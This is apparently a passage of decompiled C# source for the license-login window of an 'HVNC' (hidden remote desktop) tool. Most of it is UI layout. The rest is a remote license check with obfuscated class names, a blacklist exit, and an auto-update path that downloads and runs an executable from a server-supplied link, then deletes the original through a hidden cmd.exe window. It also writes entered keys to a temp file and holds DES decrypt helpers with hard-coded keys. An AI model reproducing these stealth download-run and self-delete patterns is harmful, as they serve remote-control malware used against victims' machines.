                    streamWriter.Dispose();
                }
                if (trance.response.success)
                {
                    Hide();
                }
                else
                {
                    status.Text = "Status: " + trance.response.message;
                }
            }
            catch
            {
            }
        }

        private void Login_FormClosed(object sender, FormClosedEventArgs e)
        {
            Application.Exit();
        }

        private void Login_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void Login_Load(object sender, EventArgs e)
        {
            if (trance.checkblack())
            {
                Environment.Exit(0);
            }
            txtKey.UseSystemPasswordChar = true;
            txtKey.Text = Settings.Default.remKey;
            if (!(txtKey.Text != ""))
            {
                return;
            }
            chkSave.Checked = true;
            if (trance.response.message == "invalidver")
            {
                if (!string.IsNullOrEmpty(trance.app_data.downloadLink))
                {
                    switch (MessageBox.Show("Yes to open file in browser\nNo to download file automatically", "Auto update", MessageBoxButtons.YesNo))
                    {
                        default:
                            MessageBox.Show("Invalid option");
                            Environment.Exit(0);
                            break;
                        case DialogResult.No:
                        {
                            WebClient webClient = new WebClient();
                            string executablePath = Application.ExecutablePath;
                            string text = random_string();
                            executablePath = executablePath.Replace(".exe", "-" + text + ".exe");
                            webClient.DownloadFile(trance.app_data.downloadLink, executablePath);
                            Process.Start(executablePath);
                            Process.Start(new ProcessStartInfo
                            {
                                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                                WindowStyle = ProcessWindowStyle.Hidden,
                                CreateNoWindow = true,
                                FileName = "cmd.exe"
                            });
                            Environment.Exit(0);
                            break;
                        }
                        case DialogResult.Yes:
                            Process.Start(trance.app_data.downloadLink);
                            Environment.Exit(0);
                            break;
                    }
                }
                MessageBox.Show("Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer");
                Thread.Sleep(2500);
                Environment.Exit(0);
                if (!trance.response.success)
                {
                    MessageBox.Show(trance.response.message);
                    Environment.Exit(0);
                }
                trance.check();
                status.Text = $"Current Session Validation Status: {trance.response.success}";
                button1.PerformClick();
                return;
            }
            chkSave.Checked = false;
            if (!(trance.response.message == "invalidver"))
            {
                return;
            }
            if (!string.IsNullOrEmpty(trance.app_data.downloadLink))
            {
                switch (MessageBox.Show("Yes to open file in browser\nNo to download file automatically", "Auto update", MessageBoxButtons.YesNo))
                {
                    default:
                        MessageBox.Show("Invalid option");
                        Environment.Exit(0);
                        break;
                    case DialogResult.No:
                    {
                        WebClient webClient2 = new WebClient();
                        string executablePath2 = Application.ExecutablePath;
                        string text2 = random_string();
                        executablePath2 = executablePath2.Replace(".exe", "-" + text2 + ".exe");
                        webClient2.DownloadFile(trance.app_data.downloadLink, executablePath2);
                        Process.Start(executablePath2);
                        Process.Start(new ProcessStartInfo
                        {
                            Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true,
                            FileName = "cmd.exe"
                        });
                        Environment.Exit(0);
                        break;
                    }
                    case DialogResult.Yes:
                        Process.Start(trance.app_data.downloadLink);
                        Environment.Exit(0);
                        break;
                }
            }
            MessageBox.Show("Version of this program does not match the one online. Furthermore, the download link online isn't set. You will need to manually obtain the download link from the developer");
            Thread.Sleep(2500);
            Environment.Exit(0);
            if (!trance.response.success)
            {
                MessageBox.Show(trance.response.message);
                Environment.Exit(0);
            }
            trance.check();
            status.Text = $"Current Session Validation Status: {trance.response.success}";
            button1.PerformClick();
        }

        private static string random_string()
        {
            string text = null;
            Random random = new Random();
            for (int i = 0; i < 5; i++)
            {
                text += Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
            }
            return text;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                trance.license(txtKey.Text);
                string value = "User key: " + txtKey.Text;
                using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "//userinfo.txt", append: true))
                {
                    streamWriter.WriteLine(value);
                    streamWriter.Dispose();
                }
                new Thread(_button1_Click_b__10_0).Start();
            }
            catch
            {
            }
        }

        private void chkSave_CheckedChanged(object sender, EventArgs e)
        {
            if (chkSave.Checked)
            {
                Settings.Default.remKey = txtKey.Text;
                Settings.Default.Save();
                string value = "User key: " + txtKey.Text;
                using StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "//userinfo.txt", append: true);
                streamWriter.WriteLine(value);
                streamWriter.Dispose();
                return;
            }
            Settings.Default.remKey = "";
            Settings.Default.Save();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom2 = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.Login));
            Bloom bloom11 = new Bloom();
            Bloom bloom12 = new Bloom();
            Bloom bloom13 = new Bloom();
            Bloom bloom14 = new Bloom();
            Bloom bloom15 = new Bloom();
            Bloom bloom16 = new Bloom();
            Bloom bloom17 = new Bloom();
            Bloom bloom18 = new Bloom();
            Bloom bloom19 = new Bloom();
            Bloom bloom20 = new Bloom();
            Bloom bloom21 = new Bloom();
            Bloom bloom22 = new Bloom();
            Bloom bloom23 = new Bloom();
            Bloom bloom24 = new Bloom();
            Bloom bloom25 = new Bloom();
            Bloom bloom26 = new Bloom();
            Bloom bloom27 = new Bloom();
            Bloom bloom28 = new Bloom();
            Bloom bloom29 = new Bloom();
            Bloom bloom30 = new Bloom();
            Bloom bloom31 = new Bloom();
            Bloom bloom32 = new Bloom();
            Bloom bloom33 = new Bloom();
            Bloom bloom34 = new Bloom();
            Bloom bloom35 = new Bloom();
            Bloom bloom36 = new Bloom();
            Bloom bloom37 = new Bloom();
            Bloom bloom38 = new Bloom();
            Bloom bloom39 = new Bloom();
            Bloom bloom40 = new Bloom();
            Bloom bloom41 = new Bloom();
            Bloom bloom42 = new Bloom();
            Bloom bloom43 = new Bloom();
            Bloom bloom44 = new Bloom();
            Bloom bloom45 = new Bloom();
            Bloom bloom46 = new Bloom();
            Bloom bloom47 = new Bloom();
            Bloom bloom48 = new Bloom();
            Bloom bloom49 = new Bloom();
            Bloom bloom50 = new Bloom();
            Bloom bloom51 = new Bloom();
            Bloom bloom52 = new Bloom();
            Bloom bloom53 = new Bloom();
            Bloom bloom54 = new Bloom();
            Bloom bloom55 = new Bloom();
            Bloom bloom56 = new Bloom();
            Bloom bloom57 = new Bloom();
            Bloom bloom58 = new Bloom();
            this.primeTheme1 = new PrimeTheme();
            this.button1 = new System.Windows.Forms.Button();
            this.status = new System.Windows.Forms.Label();
            this.label5 = new System.Windows.Forms.Label();
            this.chkSave = new JCS.ToggleSwitch();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txtKey = new System.Windows.Forms.TextBox();
            this.primeButton2 = new PrimeButton();
            this.primeButton1 = new PrimeButton();
            this.label3 = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.studioButton5 = new StudioButton();
            this.studioButton4 = new StudioButton();
            this.primeTheme1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
            base.SuspendLayout();
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = System.Drawing.Color.FromArgb(232, 232, 232);
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(150, 150, 150);
            this.primeTheme1.Colors = new Bloom[10] { bloom, bloom2, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10 };
            this.primeTheme1.Controls.Add(this.button1);
            this.primeTheme1.Controls.Add(this.status);
            this.primeTheme1.Controls.Add(this.label5);
            this.primeTheme1.Controls.Add(this.chkSave);
            this.primeTheme1.Controls.Add(this.pictureBox2);
            this.primeTheme1.Controls.Add(this.label1);
            this.primeTheme1.Controls.Add(this.txtKey);
            this.primeTheme1.Controls.Add(this.primeButton2);
            this.primeTheme1.Controls.Add(this.primeButton1);
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.studioButton4);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(548, 315);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 0;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.button1.Location = new System.Drawing.Point(242, 192);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(33, 21);
            this.button1.TabIndex = 53;
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Visible = false;
            this.button1.Click += new System.EventHandler(button1_Click);
            this.status.AutoSize = true;
            this.status.BackColor = System.Drawing.Color.Transparent;
            this.status.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.status.Location = new System.Drawing.Point(19, 285);
            this.status.Name = "status";
            this.status.Size = new System.Drawing.Size(48, 13);
            this.status.TabIndex = 52;
            this.status.Text = "Status";
            this.status.Visible = false;
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(200, 197);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(36, 13);
            this.label5.TabIndex = 51;
            this.label5.Text = "Save";
            this.chkSave.BackColor = System.Drawing.Color.Transparent;
            this.chkSave.Location = new System.Drawing.Point(144, 192);
            this.chkSave.Name = "chkSave";
            this.chkSave.OffFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkSave.OnFont = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            this.chkSave.Size = new System.Drawing.Size(50, 19);
            this.chkSave.Style = JCS.ToggleSwitch.ToggleSwitchStyle.OSX;
            this.chkSave.TabIndex = 50;
            this.chkSave.CheckedChanged += new JCS.ToggleSwitch.CheckedChangedDelegate(chkSave_CheckedChanged);
            this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
            this.pictureBox2.Location = new System.Drawing.Point(31, 87);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(104, 99);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox2.TabIndex = 49;
            this.pictureBox2.TabStop = false;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.label1.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label1.Location = new System.Drawing.Point(141, 141);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(35, 13);
            this.label1.TabIndex = 48;
            this.label1.Text = "Key:";
            this.txtKey.Location = new System.Drawing.Point(141, 157);
            this.txtKey.Multiline = true;
            this.txtKey.Name = "txtKey";
            this.txtKey.Size = new System.Drawing.Size(376, 29);
            this.txtKey.TabIndex = 47;
            bloom11.Name = "DownGradient1";
            bloom11.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom12.Name = "DownGradient2";
            bloom12.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom13.Name = "NoneGradient1";
            bloom13.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom14.Name = "NoneGradient2";
            bloom14.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom15.Name = "NoneGradient3";
            bloom15.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom16.Name = "NoneGradient4";
            bloom16.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom17.Name = "Glow";
            bloom17.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom18.Name = "TextShade";
            bloom18.Value = System.Drawing.Color.White;
            bloom19.Name = "Text";
            bloom19.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom20.Name = "Border1";
            bloom20.Value = System.Drawing.Color.White;
            bloom21.Name = "Border2";
            bloom21.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.primeButton2.Colors = new Bloom[11]
            {
                bloom11, bloom12, bloom13, bloom14, bloom15, bloom16, bloom17, bloom18, bloom19, bloom20,
                bloom21
            };
            this.primeButton2.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton2.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeButton2.Image = null;
            this.primeButton2.Location = new System.Drawing.Point(31, 229);
            this.primeButton2.Name = "primeButton2";
            this.primeButton2.NoRounding = false;
            this.primeButton2.Size = new System.Drawing.Size(126, 48);
            this.primeButton2.TabIndex = 42;
            this.primeButton2.Text = "Exit";
            this.primeButton2.Transparent = false;
            this.primeButton2.Click += new System.EventHandler(primeButton2_Click);
            bloom22.Name = "DownGradient1";
            bloom22.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom23.Name = "DownGradient2";
            bloom23.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom24.Name = "NoneGradient1";
            bloom24.Value = System.Drawing.Color.FromArgb(235, 235, 235);
            bloom25.Name = "NoneGradient2";
            bloom25.Value = System.Drawing.Color.FromArgb(215, 215, 215);
            bloom26.Name = "NoneGradient3";
            bloom26.Value = System.Drawing.Color.FromArgb(252, 252, 252);
            bloom27.Name = "NoneGradient4";
            bloom27.Value = System.Drawing.Color.FromArgb(242, 242, 242);
            bloom28.Name = "Glow";
            bloom28.Value = System.Drawing.Color.FromArgb(50, 255, 255, 255);
            bloom29.Name = "TextShade";
            bloom29.Value = System.Drawing.Color.White;
            bloom30.Name = "Text";
            bloom30.Value = System.Drawing.Color.FromArgb(80, 80, 80);
            bloom31.Name = "Border1";
            bloom31.Value = System.Drawing.Color.White;
            bloom32.Name = "Border2";
            bloom32.Value = System.Drawing.Color.FromArgb(180, 180, 180);
            this.primeButton1.Colors = new Bloom[11]
            {
                bloom22, bloom23, bloom24, bloom25, bloom26, bloom27, bloom28, bloom29, bloom30, bloom31,
                bloom32
            };
            this.primeButton1.Customization = "19fX/+vr6//r6+v/19fX//z8/P/y8vL/////Mv////9QUFD//////7S0tP8=";
            this.primeButton1.Font = new System.Drawing.Font("Verdana", 8f);
            this.primeButton1.Image = null;
            this.primeButton1.Location = new System.Drawing.Point(391, 229);
            this.primeButton1.Name = "primeButton1";
            this.primeButton1.NoRounding = false;
            this.primeButton1.Size = new System.Drawing.Size(126, 48);
            this.primeButton1.TabIndex = 41;
            this.primeButton1.Text = "Login";
            this.primeButton1.Transparent = false;
            this.primeButton1.Click += new System.EventHandler(primeButton1_Click);
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
            this.label3.Location = new System.Drawing.Point(39, 14);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(42, 13);
            this.label3.TabIndex = 40;
            this.label3.Text = "Login";
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            this.pictureBox1.Location = new System.Drawing.Point(3, -1);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(42, 40);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 39;
            this.pictureBox1.TabStop = false;
            this.studioButton5.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton5.BackColor = System.Drawing.Color.Transparent;
            bloom33.Name = "DownGradient1";
            bloom33.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom34.Name = "DownGradient2";
            bloom34.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom35.Name = "NoneGradient1";
            bloom35.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom36.Name = "NoneGradient2";
            bloom36.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom37.Name = "Shine1";
            bloom37.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom38.Name = "Shine2A";
            bloom38.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom39.Name = "Shine2B";
            bloom39.Value = System.Drawing.Color.Transparent;
            bloom40.Name = "Shine3";
            bloom40.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom41.Name = "TextShade";
            bloom41.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom42.Name = "Text";
            bloom42.Value = System.Drawing.Color.White;
            bloom43.Name = "Glow";
            bloom43.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom44.Name = "Border";
            bloom44.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom45.Name = "Corners";
            bloom45.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton5.Colors = new Bloom[13]
            {
                bloom33, bloom34, bloom35, bloom36, bloom37, bloom38, bloom39, bloom40, bloom41, bloom42,
                bloom43, bloom44, bloom45
            };
            this.studioButton5.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton5.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton5.Image = null;
            this.studioButton5.Location = new System.Drawing.Point(523, -4);
            this.studioButton5.Name = "studioButton5";
            this.studioButton5.NoRounding = false;
            this.studioButton5.Size = new System.Drawing.Size(13, 30);
            this.studioButton5.TabIndex = 38;
            this.studioButton5.Transparent = true;
            this.studioButton5.Click += new System.EventHandler(studioButton5_Click);
            this.studioButton4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            this.studioButton4.BackColor = System.Drawing.Color.Transparent;
            bloom46.Name = "DownGradient1";
            bloom46.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom47.Name = "DownGradient2";
            bloom47.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom48.Name = "NoneGradient1";
            bloom48.Value = System.Drawing.Color.FromArgb(65, 85, 115);
            bloom49.Name = "NoneGradient2";
            bloom49.Value = System.Drawing.Color.FromArgb(45, 65, 95);
            bloom50.Name = "Shine1";
            bloom50.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom51.Name = "Shine2A";
            bloom51.Value = System.Drawing.Color.FromArgb(30, 255, 255, 255);
            bloom52.Name = "Shine2B";
            bloom52.Value = System.Drawing.Color.Transparent;
            bloom53.Name = "Shine3";
            bloom53.Value = System.Drawing.Color.FromArgb(20, 255, 255, 255);
            bloom54.Name = "TextShade";
            bloom54.Value = System.Drawing.Color.FromArgb(50, 0, 0, 0);
            bloom55.Name = "Text";
            bloom55.Value = System.Drawing.Color.White;
            bloom56.Name = "Glow";
            bloom56.Value = System.Drawing.Color.FromArgb(10, 255, 255, 255);
            bloom57.Name = "Border";
            bloom57.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            bloom58.Name = "Corners";
            bloom58.Value = System.Drawing.Color.FromArgb(20, 40, 70);
            this.studioButton4.Colors = new Bloom[13]
            {
                bloom46, bloom47, bloom48, bloom49, bloom50, bloom51, bloom52, bloom53, bloom54, bloom55,
                bloom56, bloom57, bloom58
            };
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new System.Drawing.Font("Verdana", 8f);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new System.Drawing.Point(504, -4);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new System.Drawing.Size(13, 30);
            this.studioButton4.TabIndex = 37;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += new System.EventHandler(studioButton4_Click);
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            base.ClientSize = new System.Drawing.Size(548, 315);
            base.Controls.Add(this.primeTheme1);
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Name = "Login";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Login";
            base.TransparencyKey = System.Drawing.Color.Fuchsia;
            base.Load += new System.EventHandler(Login_Load);
            this.primeTheme1.ResumeLayout(false);
            this.primeTheme1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
            ((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
            base.ResumeLayout(false);
        }

        public static string D(string Message)
        {
            UTF8Encoding uTF8Encoding = new UTF8Encoding();
            MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
            byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes("CqbkTHriRRbQjaArtJfF"));
            TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
            tripleDESCryptoServiceProvider.Key = key;
            tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
            tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
            byte[] array = Convert.FromBase64String(Message);
            byte[] bytes;
            try
            {
                bytes = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length);
            }
            finally
            {
                tripleDESCryptoServiceProvider.Clear();
                mD5CryptoServiceProvider.Clear();
            }
            return uTF8Encoding.GetString(bytes);
        }

        public static string L(string message)
        {
            try
            {
                string s = "abcdefgh";
                string s2 = "hgfedcba";
                byte[] array = new byte[0];
                array = Encoding.UTF8.GetBytes(s2);
                byte[] array2 = new byte[0];
                array2 = Encoding.UTF8.GetBytes(s);
                byte[] array3 = new byte[message.Replace(" ", "+").Length];
                array3 = Convert.FromBase64String(message.Replace(" ", "+"));
                using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
                MemoryStream memoryStream = new MemoryStream();
                CryptoStream cryptoStream = new CryptoStream(memoryStream, dESCryptoServiceProvider.CreateDecryptor(array2, array), CryptoStreamMode.Write);
                cryptoStream.Write(array3, 0, array3.Length);
                cryptoStream.FlushFinalBlock();
                return Encoding.UTF8.GetString(memoryStream.ToArray());
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        static Login()
        {
            rbgcolor = "";
            assembply = "";
            copria = "";
            elso = "";
            trance = new colortabpate(rbgcolor, assembply, copria, elso);
        }

        [CompilerGenerated]
        private void _button1_Click_b__10_0()
        {
            if (trance.response.success)
            {
                Hide();
            }
            else
            {
                status.Text = "Status: " + trance.response.message;
            }
        }
    }
}
